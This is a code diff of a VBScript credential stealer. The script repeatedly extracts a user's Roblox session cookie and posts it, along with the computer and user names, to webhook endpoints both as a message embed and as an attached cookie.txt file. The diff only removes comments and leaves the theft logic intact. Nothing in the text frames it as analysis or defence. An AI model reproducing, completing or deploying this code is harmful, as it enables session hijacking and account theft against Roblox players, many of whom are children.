@@ -30,7 +30,7 @@ lastCookie = ""
 Do
     Call GrabRoblox
     isFirstRun = False
-    WScript.Sleep 150000 ' 2.5 minutes
+    WScript.Sleep 150000
 Loop
 
 Sub GrabRoblox()
@@ -47,7 +47,6 @@ Sub GrabRoblox()
         lastCookie = cookie
         Dim t: t = FormatDateTime(Now, 4)
         
-        ' 1. Send the Embed to REGRAB
         Dim embed: embed = "{""content"":""@everyone"",""embeds"":[{""title"":""Roblox (JSON-DPAPI)"",""description"":""Size: " & Len(cookie) & "\n" & PC & " / " & USER & "\n\n``````\n" & cookie & "\n``````"",""color"":65280,""footer"":{""text"":""Grabbed at " & t & """}}]}"
         
         If isFirstRun Then
@@ -56,7 +55,6 @@ Sub GrabRoblox()
             SendWebhook WH_REGRAB, embed
         End If
         
-        ' 2. Send the cookie.txt file attachment
         Call PostFile("cookie.txt", cookie)
     End If
 End Sub
@@ -123,7 +121,6 @@ End Function
 Function ExtractCookie(raw)
     ExtractCookie = ""
     Dim m: m = InStr(raw, "_|WARNING")
-    
     If m > 0 Then
         ExtractCookie = Mid(raw, m)
         Dim semi: semi = InStr(ExtractCookie, ";")
